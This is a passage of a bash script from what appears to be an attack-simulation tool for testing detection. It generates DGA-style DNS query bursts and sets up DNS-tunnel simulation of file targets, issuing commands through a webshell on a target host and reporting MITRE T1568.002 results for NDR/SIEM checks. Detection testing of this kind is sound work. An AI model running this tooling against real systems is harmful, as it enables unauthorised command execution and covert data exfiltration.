    dga_simulation_log_both "DGA query tool fallback: assuming dig on webshell host (preflight may have confirmed DNS)"
    return 0
}

dga_ensure_resolver() {
    local picked=""
    picked=$(select_dga_dns_resolver) || picked=""
    if [[ -z "${picked}" || "${picked}" == none ]]; then
        dga_select_system_resolver_mode
        picked="system"
    fi
    if [[ "${picked}" != system ]]; then
        picked=$(poc_extract_ipv4 "${picked}")
        [[ -z "${picked}" ]] && {
            dga_select_system_resolver_mode
            picked="system"
        }
    fi
    printf '%s' "${picked}"
}

dga_validate_system_resolver_remote() {
    local out="" tool="${DGA_QUERY_TOOL:-dig}"
    if [[ "${DRY_RUN}" == true ]]; then
        return 0
    fi
    case "${tool}" in
        dig)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "dig +time=2 +tries=1 +noall +answer poc-lab-dga-probe.invalid A 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        nslookup)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "nslookup -timeout=2 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        host)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "host -W 2 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        getent)
            out=$(run_webshell_quick "dga-sys-resolver-probe" \
                "getent ahostsv4 poc-lab-dga-probe.invalid 2>&1 | head -n 5" 2>/dev/null || true)
            ;;
        *) return 1 ;;
    esac
    [[ -n "${out}" ]] && printf '%s' "${out}" | grep -qiE 'NXDOMAIN|not found|can.t find|SERVFAIL|timed out|no servers|connection refused|Host not found'
}

dga_select_system_resolver_mode() {
    discover_dns_upstream_from_webshell >/dev/null 2>&1 || true
    DGA_DNS_SERVER="system"
    DGA_DNS_SOURCE="system_resolver"
    DGA_DNS_DETAIL="system resolver (dig/nslookup without @server; stub=${DNS_STUB_RESOLVER:-n/a} upstream=${DNS_UPSTREAM_DNS:-n/a})"
    log_dga_resolver_discovery "system" "${DGA_DNS_DETAIL}"
    dga_simulation_log_both "DGA resolver mode=system_resolver stub=${DNS_STUB_RESOLVER:-} upstream=${DNS_UPSTREAM_DNS:-}"
    printf '%s' "system"
}

select_dga_dns_resolver() {
    local scan_hosts target="" source="" detail="" host user_srv="" scan_fallback="" validated_target=""
    DGA_SKIP_REASON=""
    user_srv="${DGA_DNS_USER_SERVER}"

    scan_hosts=$(discover_dns_servers_from_scan)
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        host=$(poc_extract_ipv4 "${host}")
        [[ -z "${host}" ]] && continue
        dns_resolver_is_stub "${host}" && continue
        [[ -z "${scan_fallback}" ]] && scan_fallback="${host}"
        if [[ -z "${validated_target}" ]] && validate_dns_server_remote "${host}" "dga-scan"; then
            validated_target="${host}"
        fi
    done <<< "${scan_hosts}"

    if [[ -n "${validated_target}" ]]; then
        target="${validated_target}"
        source="scan"
        detail="target-net DNS from dns_hosts.txt (query-validated)"
    elif [[ -n "${scan_fallback}" ]]; then
        target="${scan_fallback}"
        source="scan"
        detail="target-net DNS from dns_hosts.txt"
        validate_dns_server_remote "${target}" "dga-scan" >/dev/null 2>&1 || true
    fi

    if [[ -z "${target}" ]]; then
        while IFS= read -r host; do
            [[ -z "${host}" ]] && continue
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            [[ -z "${DNS_UPSTREAM_DNS}" ]] && discover_dns_upstream_from_webshell >/dev/null || true
            target="${host}"
            source="systemd-resolved"
            detail="upstream DNS from resolvectl (stub excluded)"
            if validate_dns_server_remote "${host}" "dga-resolver"; then
                detail="upstream DNS from resolvectl (query-validated; stub excluded)"
                break
            fi
        done < <(discover_dns_upstream_from_webshell)
    fi

    if [[ -z "${target}" && -n "${user_srv}" ]]; then
        host=$(poc_extract_ipv4 "${user_srv}")
        if [[ -n "${host}" ]] && ! dns_resolver_is_stub "${host}"; then
            target="${host}"
            source="user"
            detail="operator --dga-dns-server"
            validate_dns_server_remote "${host}" "dga-user" >/dev/null 2>&1 || true
        fi
    fi

    if [[ -z "${target}" ]]; then
        dga_select_system_resolver_mode
        return 0
    fi
    if ! validate_dns_server_remote "${target}" "dga-preflight"; then
        dga_simulation_log_both "DGA explicit resolver ${target} validation failed; falling back to system resolver"
        dga_select_system_resolver_mode
        return 0
    fi
    DGA_DNS_SERVER="${target}"
    DGA_DNS_SOURCE="${source}"
    DGA_DNS_DETAIL="${detail}"
    log_dga_resolver_discovery "${target}" "${detail}"
    dga_simulation_log_both "DGA resolver selected server=${target} source=${source} detail=${detail}"
    printf '%s' "${target}"
}

log_dga_resolver_discovery() {
    local selected="${1}" reason="${2:-${DGA_DNS_DETAIL:-unknown}}"
    local resolver_label="${selected}"
    [[ "${selected}" == system || -z "${selected}" || "${selected}" == none ]] && resolver_label="system"
    [[ -z "${DGA_DNS_SOURCE}" ]] && DGA_DNS_SOURCE="system_resolver"
    local msg="DGA_RESOLVER_DISCOVERY resolver=${resolver_label} source=${DGA_DNS_SOURCE:-system_resolver} stub_resolver=${DNS_STUB_RESOLVER:-} upstream_dns=${DNS_UPSTREAM_DNS:-} selected_dns=${resolver_label} reason=${reason}"
    state_append "dga_resolver_discovery.log" "${msg}"
    append_dga_simulation_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dga_simulation_summary() {
    local msg="DGA_SIMULATION_SUMMARY queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} resolver=${DGA_DNS_SERVER:-} source=${DGA_DNS_SOURCE:-unknown}"
    dga_simulation_log_both "${msg}"
}

dga_compute_detection_likelihood() {
    local total="$1" nx="$2" resolved="$3" same_etld="$4"
    local entropy="${5:-${DGA_ENTROPY_SCORE:-0}}"
    local sent random_domains
    DGA_DETECTION_LIKELIHOOD="LOW"
    DGA_DETECTION_REASON=""
    entropy=$(safe_int "${entropy}")
    total=$(safe_int "${total}")
    nx=$(safe_int "${nx}")
    resolved=$(safe_int "${resolved}")
    sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    random_domains=$(safe_int "${DGA_ACTUAL_RANDOM_DOMAINS:-0}")
    if (( entropy >= 45 && sent >= 150 && nx >= 150 && random_domains >= 150 )); then
        DGA_DETECTION_LIKELIHOOD="HIGH"
        DGA_DETECTION_REASON="seed_dga_entropy>=4.5 nxdomain_burst random_domain_burst"
        return 0
    fi
    if (( total >= 103 && nx >= 80 && sent >= 80 )) && [[ "${same_etld}" == yes ]]; then
        DGA_DETECTION_LIKELIHOOD="HIGH"
        DGA_DETECTION_REASON="nxdomain_burst+resolvable_same_tld"
        return 0
    fi
    if (( entropy >= 30 && total >= 50 && nx >= 40 )); then
        DGA_DETECTION_LIKELIHOOD="MEDIUM"
        DGA_DETECTION_REASON="partial_dga_entropy_pattern"
        return 0
    fi
    if (( total >= 103 && nx >= 50 && resolved >= 1 )); then
        DGA_DETECTION_LIKELIHOOD="MEDIUM"
        DGA_DETECTION_REASON="partial_dga_pattern"
        return 0
    fi
    DGA_DETECTION_REASON="insufficient_nxdomain_volume_or_resolvable_followup"
}

dga_apply_stage_final_summary_from_line() {
    local line="$1"
    [[ -z "${line}" ]] && return 1
    DGA_TOTAL_QUERIES=$(safe_int "$(dns_stats_field_from_line "${line}" queries)")
    DGA_NXDOMAIN_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    DGA_RESOLVED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES}"
    return 0
}

dga_apply_summary_from_line() {
    local line="$1" queries="" nx="" resolvable=""
    queries=$(dns_stats_field_from_line "${line}" queries)
    nx=$(dns_stats_field_from_line "${line}" nxdomain)
    resolvable=$(dns_stats_field_from_line "${line}" resolvable)
    [[ -z "${queries}" ]] && queries=$(dns_stats_field_from_line "${line}" total_queries)
    [[ -z "${nx}" ]] && nx=$(dns_stats_field_from_line "${line}" nxdomain_count)
    [[ -z "${resolvable}" ]] && resolvable=$(dns_stats_field_from_line "${line}" resolved_count)
    DGA_TOTAL_QUERIES=$(safe_int "${queries}")
    DGA_NXDOMAIN_COUNT=$(safe_int "${nx}")
    DGA_RESOLVED_COUNT=$(safe_int "${resolvable}")
    DGA_TIMEOUT_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" timeout_count)")
    DGA_ERROR_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" error_count)")
    DGA_SAME_EFFECTIVE_TLD=$(dns_stats_field_from_line "${line}" same_effective_tld)
    DGA_DETECTION_LIKELIHOOD=$(dns_stats_field_from_line "${line}" detection_likelihood)
    DGA_DETECTION_REASON=$(dns_stats_field_from_line "${line}" reason)
    DGA_GENERATED_COUNT=$(safe_int "$(dns_stats_field_from_line "${line}" generated)")
    DGA_ENTROPY_SCORE=$(safe_int "$(dns_stats_field_from_line "${line}" entropy)")
    (( DGA_GENERATED_COUNT < 1 )) && DGA_GENERATED_COUNT="${DGA_TOTAL_QUERIES}"
    [[ -z "${DGA_SAME_EFFECTIVE_TLD}" ]] && DGA_SAME_EFFECTIVE_TLD="yes"
    [[ -z "${DGA_DETECTION_LIKELIHOOD}" ]] && DGA_DETECTION_LIKELIHOOD="LOW"
}

dga_accumulate_chunk_summary() {
    local line="$1"
    local q="" nx="" res="" to="" err="" gen="" rnd=""
    q=$(safe_int "$(dns_stats_field_from_line "${line}" queries)")
    nx=$(safe_int "$(dns_stats_field_from_line "${line}" nxdomain)")
    res=$(safe_int "$(dns_stats_field_from_line "${line}" resolvable)")
    to=$(safe_int "$(dns_stats_field_from_line "${line}" timeout_count)")
    err=$(safe_int "$(dns_stats_field_from_line "${line}" error_count)")
    gen=$(safe_int "$(dns_stats_field_from_line "${line}" query_generated)")
    (( gen < 1 )) && gen=$(safe_int "$(dns_stats_field_from_line "${line}" generated)")
    rnd=$(safe_int "$(dns_stats_field_from_line "${line}" actual_random_domains)")
    DGA_TOTAL_QUERIES=$((DGA_TOTAL_QUERIES + q))
    DGA_NXDOMAIN_COUNT=$((DGA_NXDOMAIN_COUNT + nx))
    DGA_RESOLVED_COUNT=$((DGA_RESOLVED_COUNT + res))
    DGA_TIMEOUT_COUNT=$((DGA_TIMEOUT_COUNT + to))
    DGA_ERROR_COUNT=$((DGA_ERROR_COUNT + err))
    if (( gen > 0 )); then
        DGA_QUERY_GENERATED=$((DGA_QUERY_GENERATED + gen))
    fi
    if (( rnd > 0 )); then
        DGA_ACTUAL_RANDOM_DOMAINS=$((DGA_ACTUAL_RANDOM_DOMAINS + rnd))
    fi
}

dga_emit_aggregated_simulation_summary() {
    local resolver="$1" res_tld="$2"
    DGA_GENERATED_COUNT="${DGA_QUERY_GENERATED:-${DGA_TOTAL_QUERIES}}"
    dga_compute_detection_likelihood "${DGA_TOTAL_QUERIES}" "${DGA_NXDOMAIN_COUNT}" "${DGA_RESOLVED_COUNT}" "${DGA_SAME_EFFECTIVE_TLD:-yes}" "${DGA_ENTROPY_SCORE:-0}"
    local msg="DGA_SIMULATION_SUMMARY queries=${DGA_TOTAL_QUERIES} nxdomain=${DGA_NXDOMAIN_COUNT} resolvable=${DGA_RESOLVED_COUNT} resolver=${resolver} resolvable_tld=${res_tld} timeout_count=${DGA_TIMEOUT_COUNT} error_count=${DGA_ERROR_COUNT} same_effective_tld=${DGA_SAME_EFFECTIVE_TLD:-yes} detection_likelihood=${DGA_DETECTION_LIKELIHOOD} reason=${DGA_DETECTION_REASON} query_generated=${DGA_QUERY_GENERATED:-0} query_sent=${DGA_QUERY_SENT_COUNT:-0} query_responded=${DGA_QUERY_RESPONDED_COUNT:-0} actual_dns_queries=${DGA_ACTUAL_DNS_QUERIES:-0} actual_random_domains=${DGA_ACTUAL_RANDOM_DOMAINS:-0} actual_nxdomain=${DGA_ACTUAL_NXDOMAIN:-0}"
    dga_simulation_log_both "${msg}"
    msg="DGA_SUMMARY generated=${DGA_GENERATED_COUNT} resolved=${DGA_RESOLVED_COUNT} nxdomain=${DGA_NXDOMAIN_COUNT} entropy=${DGA_ENTROPY_SCORE:-0} likelihood=${DGA_DETECTION_LIKELIHOOD} query_sent=${DGA_QUERY_SENT_COUNT:-0} query_responded=${DGA_QUERY_RESPONDED_COUNT:-0}"
    dga_simulation_log_both "${msg}"
}

dga_replay_structured_logs() {
    local out="$1" line
    ingest_remote_events "${out}" "DGA_SIMULATION" || true
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ -z "${line}" ]] && continue
        case "${line}" in
            DGA_SIMULATION_SUMMARY*|DGA_SUMMARY*)
                continue
                ;;
            DGA_SIMULATION_START*|DGA_PHASE_START*|DGA_NXDOMAIN_QUERY*|DGA_RESOLVABLE_QUERY*|DGA_DOMAIN_GENERATION*|DGA_DOMAIN_GENERATED*|DGA_QUERY_SENT*|DGA_QUERY_RESULT*|DGA_NX_CHUNK_SUMMARY*|DGA_CHUNK_SUMMARY*|DGA_RESOLVER_DISCOVERY*|DNS_QUERY_GENERATED*|DNS_QUERY_SENT*|DNS_QUERY_RESPONSE*)
                dga_simulation_log_both "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DGA_' || true)"
}

build_dga_simulation_remote_cmd() {
    build_dga_model_client_remote_cmd "$@"
}

run_dga_simulation() {
    local nx_planned="" res_planned="" stage_rc=0 out=""
    DGA_SKIP_REASON=""
    DGA_STAGE_STATUS="skipped"
    DGA_FINAL_RESULT="skipped"
    DGA_MODEL_BASE_DOMAIN="${DGA_BASE_DOMAIN:-xdr.ooo}"
    nx_planned=$(resolve_dga_detection_window_plan "${DGA_NXDOMAIN_QUERIES}")
    res_planned=$(resolve_dga_resolvable_query_plan "${DGA_RESOLVABLE_QUERIES}")
    DGA_QUERIES_PLANNED=$((nx_planned + res_planned))

    if [[ "${DGA_SIMULATION_ENABLED}" != true ]]; then
        DGA_SKIP_REASON="disabled"
        dga_simulation_log_both "DGA simulation skipped (disabled)"
        return 0
    fi

    if [[ "${DRY_RUN}" == true ]]; then
        poc_sot_paths_init
        init_event_store 2>/dev/null || true
        net_sim_dga_dry_run_events
        event_sync_legacy_counters_from_sot || true
        finalize_dga_simulation_stage_judgment "DGA Simulation" "dry_run "
        return 0
    fi

    log_detection_window_plan "DGA_Simulation" "system" "${DETECTION_WINDOW_DGA_WINDOW_SECONDS}" \
        "nx_nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN},resolvable_resolved>=10,same_base_domain=xdr.ooo" \
        "${DGA_QUERIES_PLANNED}" "dga_model_client phase1_nxdomain phase2_resolvable"

    DGA_TOTAL_QUERIES=0
    DGA_NXDOMAIN_COUNT=0
    DGA_RESOLVED_COUNT=0
    DGA_SAME_EFFECTIVE_TLD="yes"

    run_dga_model_client "${CAMPAIGN_ID:-run}" || stage_rc=$?
    out="${DGA_MODEL_LAST_OUT:-}"
    event_sync_legacy_counters_from_sot || true
    net_sim_block_stdout_final_decision "DGA_SIMULATION" "${out}"

    local dga_ec=0
    dga_ec=$(event_module_event_count "DGA_SIMULATION")
    if (( dga_ec == 0 )); then
        DGA_SKIP_REASON="${DGA_SKIP_REASON:-dga_model_no_events}"
        DGA_STAGE_STATUS="Failed"
        DGA_FINAL_RESULT="failed"
        dga_simulation_log_both "DGA model client failed: ${DGA_SKIP_REASON} (no DGA SOT events)"
        return 1
    fi

    DGA_NXDOMAIN_COUNT=$(safe_int "$(event_summary_field "$(build_module_summary_from_events DGA_SIMULATION 2>/dev/null || true)" nxdomain 0)")
    DGA_RESOLVED_COUNT=$(safe_int "$(event_summary_field "$(build_module_summary_from_events DGA_SIMULATION 2>/dev/null || true)" resolvable 0)")
    DGA_TOTAL_QUERIES=$((DGA_NXDOMAIN_COUNT + DGA_RESOLVED_COUNT))
    DGA_QUERIES_ATTEMPTED="${DGA_QUERIES_PLANNED}"
    DGA_QUERIES_SENT="${DGA_QUERIES_PLANNED}"

    log_detection_window_summary "DGA_Simulation" "system" "0" "${DGA_NXDOMAIN_COUNT:-0}" \
        "nx_nxdomain>=${DETECTION_WINDOW_DGA_NXDOMAIN}" \
        "$([[ $(safe_int "${DGA_NXDOMAIN_COUNT:-0}") -ge ${DETECTION_WINDOW_DGA_NXDOMAIN} ]] && printf yes || printf no)" \
        "SOT" "dga_model_client_events"

    finalize_dga_simulation_stage_judgment "DGA Simulation" ""
    log_message "OK" "DGA Simulation complete (SOT): ${EVENT_MODULE_SUMMARY[DGA_SIMULATION]:-}"
    return "${stage_rc}"
}

finalize_dga_simulation_stage_judgment() {
    local stage_label="${1:-DGA Simulation}" detail_prefix="${2:-}"
    local summary="" decision="" reason="" detail="" stage_rc="Failed" stage_msg=""
    local nx=0 nx_sent=0 resolved=0 res_sent=0 base_dom=""
    event_stage_mark_executed "DGA_SIMULATION" "dga_model_client"
    validate_event_store_integrity || true
    summary=$(build_module_summary_from_events "DGA_SIMULATION" 2>/dev/null || true)
    read -r decision reason <<< "$(validate_module_from_summary "DGA_SIMULATION" "${summary}" "dga_model_client")"
    nx=$(safe_int "$(event_summary_field "${summary}" nxdomain 0)")
    nx_sent=$(safe_int "$(event_summary_field "${summary}" nx_sent 0)")
    resolved=$(safe_int "$(event_summary_field "${summary}" resolvable 0)")
    res_sent=$(safe_int "$(event_summary_field "${summary}" resolvable_sent 0)")
    base_dom=$(event_summary_field "${summary}" base_domain "xdr.ooo")
    event_sync_legacy_counters_from_sot || true
    DGA_FINAL_RESULT="${decision}"
    DGA_SKIP_REASON="${reason}"
    case "${decision}" in
        success) stage_rc="Success"; DGA_STAGE_STATUS="Success" ;;
        partial) stage_rc="Partial"; DGA_STAGE_STATUS="Partial" ;;
        skipped) stage_rc="Skipped"; DGA_STAGE_STATUS="Skipped" ;;
        *) stage_rc="Failed"; DGA_STAGE_STATUS="Failed" ;;
    esac
    detail="${detail_prefix}base_domain=${base_dom} nx_sent=${nx_sent} nx_nxdomain=${nx} resolvable_sent=${res_sent} resolvable_resolved=${resolved} ${reason}"
    set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    log_dns_query_pipeline_summary "DGA" "${DGA_FINAL_RESULT:-failed}"
    if declare -F e2e_emit_dga_final_summary >/dev/null 2>&1; then
        e2e_emit_dga_final_summary || true
    fi
    stage_msg="DGA_STAGE_FINAL_SUMMARY stage=${stage_label} status=${DGA_STAGE_STATUS} base_domain=${base_dom} nx_sent=${nx_sent} nx_nxdomain=${nx} resolvable_sent=${res_sent} resolvable_resolved=${resolved} ${summary} decision=${decision} reason=${reason}"
    dga_simulation_log_both "${stage_msg}"
}

run_dga_failure_recovery() {
    local sim_rc=0
    [[ "${DGA_FALLBACK_ATTEMPTED}" == true ]] && return 1
    DGA_FALLBACK_ATTEMPTED=true
    log_dga_failure_analysis
    dga_simulation_log_both "DGA failure recovery: retry dga_model_client (xdr.ooo)"
    run_dga_simulation || sim_rc=$?
    if [[ "${DGA_STAGE_STATUS}" == Success || "${DGA_STAGE_STATUS}" == Partial ]]; then
        dga_simulation_log_both "DGA fallback recovery succeeded"
        return 0
    fi
    return "${sim_rc}"
}

followup_stage_dga() {
    local sim_rc=0
    [[ "${DGA_SIMULATION_ENABLED}" != true ]] && {
        add_skipped_stage "DGA Simulation" "disabled (--disable-dga)"
        set_stage_result "DGA Simulation" "Skipped" "disabled"
        DGA_STAGE_STATUS="skipped"
        DGA_SKIP_REASON="disabled"
        write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "skipped" "disabled"
        poc_run_dga_live_log_validation || true
        return 0
    }
    poc_obs_stage_start "DGA Simulation"
    add_executed_stage "DGA Simulation"
    write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "start" "DGA-like DNS query burst intensity=${FOLLOWUP_INTENSITY}"
    if [[ "${DRY_RUN}" != true && "${DNS_ENVIRONMENT_BLOCKED}" == true ]]; then
        DGA_STAGE_STATUS="Failed"
        DGA_FINAL_RESULT="failed"
        DGA_SKIP_REASON="ENVIRONMENT_BLOCKED ${DNS_ENVIRONMENT_BLOCK_REASON}"
        set_stage_result "DGA Simulation" "Failed" "${DGA_SKIP_REASON}"
        write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "failed" "ENVIRONMENT_BLOCKED"
        poc_run_dga_live_log_validation || true
        poc_obs_stage_end "DGA Simulation"
        return 1
    fi
    sim_rc=0
    run_dga_simulation || sim_rc=$?
    DGA_QUERIES_ATTEMPTED="${DGA_TOTAL_QUERIES:-0}"
    DGA_QUERIES_SENT="${DGA_TOTAL_QUERIES:-0}"
    if [[ "${DGA_STAGE_STATUS}" == Failed || "${DGA_STAGE_STATUS}" == Skipped ]]; then
        run_dga_failure_recovery || sim_rc=$?
    fi
    finalize_dga_simulation_stage_judgment "DGA Simulation" "DGA pattern "
    case "${DGA_STAGE_STATUS}" in
        Success)
            if (( $(safe_int "${DGA_NXDOMAIN_COUNT:-0}") >= 300 && $(safe_int "${DGA_RESOLVED_COUNT:-0}") >= 10 )); then
                write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "success" "dga model nx=${DGA_NXDOMAIN_COUNT} resolved=${DGA_RESOLVED_COUNT}"
            else
                DGA_STAGE_STATUS="Failed"
                DGA_FINAL_RESULT="failed"
                write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "failed" "insufficient_nx_or_resolved"
            fi
            ;;
        Partial)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "partial" "${DGA_DETECTION_REASON:-partial}"
            ;;
        Skipped)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "skipped" "${DGA_SKIP_REASON:-skipped}"
            ;;
        *)
            write_report_entries "dga_simulation" "T1568.002" "NDR/SIEM" "DGA Simulation" "${TARGET_NET}" "failed" "${DGA_SKIP_REASON:-failed queries=${DGA_TOTAL_QUERIES:-0} nx=${DGA_NXDOMAIN_COUNT:-0}}"
            log_dga_failure_analysis
            ;;
    esac
    poc_run_dga_live_log_validation || true
    save_dga_simulation_overlap_result
    poc_obs_stage_end "DGA Simulation"
    return "${sim_rc}"
}

dns_tunnel_resolve_mode_plan() {
    local mode="${1:-auto}" total="${2:-200}"
    local cl=0 infra=0 txt=0 tunnel=0 mode_used=""
    total=$(safe_int "${total}")
    (( total < DNS_TUNNEL_MIN_QUERIES )) && total="${DNS_TUNNEL_MIN_QUERIES}"
    (( total > DNS_TUNNEL_MAX_QUERIES )) && total="${DNS_TUNNEL_MAX_QUERIES}"
    case "${mode}" in
        cluster-local)
            cl="${total}"
            mode_used="cluster-local"
            ;;
        infrastructure)
            infra="${total}"
            mode_used="infrastructure"
            ;;
        txt-burst)
            txt="${total}"
            mode_used="txt-burst"
            ;;
        all)
            infra=$((total * 65 / 100)); (( infra < 130 )) && infra=130
            txt=$((total - infra)); (( txt < 70 )) && txt=70
            infra=$((total - txt))
            mode_used="all"
            ;;
        auto|*)
            tunnel=$((total * 35 / 100)); (( tunnel < 80 )) && tunnel=80
            infra=$((total * 35 / 100)); (( infra < 70 )) && infra=70
            txt=$((total - tunnel - infra)); (( txt < 50 )) && txt=50
            tunnel=$((total - infra - txt))
            mode_used="auto"
            ;;
    esac
    DNS_TUNNEL_MODE_USED="${mode_used}"
    printf '%s %s %s %s %s %s\n' "${cl}" "${infra}" "${txt}" "${tunnel:-0}" "${total}" "${mode_used}"
}

build_dns_tunnel_simulation_remote_cmd() {
    local total="$1" _dns_server="$2" domain="${3:-${DNS_TUNNEL_SIM_DOMAIN}}" _mode="$4" _sleep_ms="$5" _jitter_ms="$6" _tool="$7" campaign="${8:-${CAMPAIGN_ID:-run}}" _chunk_fast="${9:-no}"
    local planned=0 targets=""
    planned=$(safe_int "${total}")
    (( planned < 1 )) && planned=150
    DNS_TUNNEL_SIM_DOMAIN="${domain}"
    DNS_TUNNEL_MAX_SENT_CAP="${planned}"
    DNS_TUNNEL_DOMAIN_SUFFIX="${domain}"
    select_dns_tunnel_file_targets 2>/dev/null || true
    targets="${DNS_TUNNEL_FILE_TARGETS}"
    [[ -n "${targets}" ]] || return 1
    build_dns_tunnel_file_client_remote_cmd "${targets}" "${campaign}"
}


parse_dns_tunnel_sim_stats_line() {
    local out="$1" line
    local attempted=0 success=0 fail=0 nx=0 timeout=0 a=0 txt=0 avg=0 max=0 entropy=0 ex1="" ex2="" ex3=""
    local planned=0 unique=0 resolved=0 error=0 avg_label=0 max_label=0
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_TUNNEL_SIM_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(dns_stats_field_from_line "${line}" attempted)")
        planned=$(safe_int "$(dns_stats_field_from_line "${line}" planned)")
        unique=$(safe_int "$(dns_stats_field_from_line "${line}" unique)")
        success=$(safe_int "$(dns_stats_field_from_line "${line}" success)")
        fail=$(safe_int "$(dns_stats_field_from_line "${line}" fail)")
        nx=$(safe_int "$(dns_stats_field_from_line "${line}" nx)")
        resolved=$(safe_int "$(dns_stats_field_from_line "${line}" resolved)")
        timeout=$(safe_int "$(dns_stats_field_from_line "${line}" timeout)")
        error=$(safe_int "$(dns_stats_field_from_line "${line}" error)")
        a=$(safe_int "$(dns_stats_field_from_line "${line}" a)")
        txt=$(safe_int "$(dns_stats_field_from_line "${line}" txt)")
        avg=$(safe_int "$(dns_stats_field_from_line "${line}" avg_fqdn)")
        max=$(safe_int "$(dns_stats_field_from_line "${line}" max_fqdn)")
        avg_label=$(safe_int "$(dns_stats_field_from_line "${line}" avg_label)")
        max_label=$(safe_int "$(dns_stats_field_from_line "${line}" max_label)")
        entropy=$(safe_int "$(dns_stats_field_from_line "${line}" entropy)")
        ex1=$(dns_stats_field_from_line "${line}" ex1)
        ex2=$(dns_stats_field_from_line "${line}" ex2)
        ex3=$(dns_stats_field_from_line "${line}" ex3)
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s' \
        "${attempted}" "${planned}" "${unique}" "${success}" "${fail}" "${nx}" "${resolved}" "${timeout}" "${error}" \
        "${a}" "${txt}" "${avg}" "${max}" "${entropy}" "${ex1}" "${ex2}" "${ex3}" "${avg_label}" "${max_label}"
}

parse_dns_tunnel_query_exec_lines() {
    local out="$1" line server query qtype result
    while IFS= read -r line; do
        [[ "${line}" != *"DNS_TUNNEL_QUERY_EXEC"* ]] && continue
        server=$(dns_stats_field_from_line "${line}" server)
        query=$(dns_stats_field_from_line "${line}" query)
        qtype=$(dns_stats_field_from_line "${line}" qtype)
        result=$(dns_stats_field_from_line "${line}" result)
        log_dns_tunnel_query_exec "${server}" "${query}" "${qtype}" "${result}"
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_TUNNEL_QUERY_EXEC' || true)"
}

aggregate_dns_query_telemetry_from_output() {
    local out="$1" line="" attempts=0 unique_fqs="" fq="" nx=0 resolved=0 timeout=0 error=0 responded=0
    aggregate_dns_query_verification_from_output "${out}" "dns_tunnel" || true
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        case "${line}" in
            DNS_QUERY_ATTEMPT*)
                attempts=$((attempts + 1))
                fq=$(dns_stats_field_from_line "${line}" fqdn)
                [[ -z "${fq}" ]] && fq=$(dns_stats_field_from_line "${line}" query)
                case " ${unique_fqs} " in
                    *" ${fq} "*) ;;
                    *) unique_fqs="${unique_fqs} ${fq}" ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_RESPONSE*)
                responded=$((responded + 1))
                case "${line}" in
                    *result=nxdomain*) nx=$((nx + 1)) ;;
                    *result=resolved*) resolved=$((resolved + 1)) ;;
                    *result=timeout*) timeout=$((timeout + 1)) ;;
                    *result=error*) error=$((error + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_SUCCESS*)
                [[ "${out}" == *DNS_QUERY_RESPONSE* ]] && continue
                case "${line}" in
                    *result=nxdomain*) nx=$((nx + 1)) ;;
                    *result=resolved*) resolved=$((resolved + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_TIMEOUT*)
                timeout=$((timeout + 1))
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_ERROR*)
                error=$((error + 1))
                log_dns_tunnel_query_telemetry "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_QUERY_(ATTEMPT|RESPONSE|SUCCESS|TIMEOUT|ERROR)' || true)"
    if (( responded > 0 )); then
        attempts="${responded}"
    fi
    if (( attempts > 0 )); then
        DNS_QUERIES_ATTEMPTED="${attempts}"
        DNS_TUNNEL_UNIQUE_QUERIES=$(safe_int "$(printf '%s' "${unique_fqs}" | awk '{c=0; for(i=1;i<=NF;i++) if($i!="") c++; print c+0}')")
        (( nx > 0 )) && DNS_TUNNEL_NXDOMAIN_COUNT="${nx}"
        (( resolved > 0 )) && DNS_TUNNEL_RESOLVED_COUNT="${resolved}"
        (( timeout > 0 )) && DNS_TUNNEL_TIMEOUT_COUNT="${timeout}"
        (( error > 0 )) && DNS_TUNNEL_ERROR_COUNT="${error}"
        DNS_RESPONSES_RECEIVED=$((nx + resolved + timeout + error))
